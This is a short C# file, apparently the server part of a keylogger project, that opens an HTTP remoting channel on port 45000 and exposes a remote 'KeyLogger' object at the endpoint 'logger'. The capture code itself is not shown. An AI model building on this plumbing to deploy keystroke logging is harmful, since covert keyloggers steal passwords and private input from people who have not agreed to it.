using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.Remoting.Channels;

namespace Ibrahim.KeyLogger.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            HttpChannel channel = new HttpChannel(45000);
            ChannelServices.RegisterChannel(channel,false);

            RemotingConfiguration.RegisterWellKnownServiceType(typeof(Ibrahim.RemoteObject.KeyLogger), "logger", WellKnownObjectMode.Singleton);
            Console.ReadLine();
        }
    }
}
